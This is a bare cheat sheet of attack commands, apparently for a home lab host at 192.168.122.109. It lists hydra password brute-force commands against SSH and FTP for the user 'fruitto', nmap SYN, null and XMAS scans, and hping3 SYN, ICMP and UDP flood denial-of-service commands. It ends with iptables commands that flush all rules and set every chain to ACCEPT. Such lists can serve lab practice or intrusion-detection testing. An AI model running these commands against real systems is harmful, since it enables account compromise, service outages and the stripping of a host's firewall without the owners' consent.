# SSH Brute Force
hydra -l fruitto -P wordlist.txt ssh://192.168.122.109

# FTP Brute Force
hydra -l fruitto -P wordlist.txt ftp://192.168.122.109

# Syn Scan
nmap 192.168.122.109
# Null Scan
nmap -sN 192.168.122.109
# XMAS Scan
nmap -sX 192.168.122.109
# Full XMAS Scan
nmap --scanflags ALL 192.168.122.109

# Syn Flood (DoS)
sudo hping3 -S --flood -p 22 192.168.122.109
# ICMP Flood (DoS)
sudo hping3 --icmp --flood -d 1400 192.168.122.109
# UDP Flood (DoS)
hping3 --udp --flood 192.168.122.109

# Clear iptable
sudo iptables -F
sudo iptables -X

sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT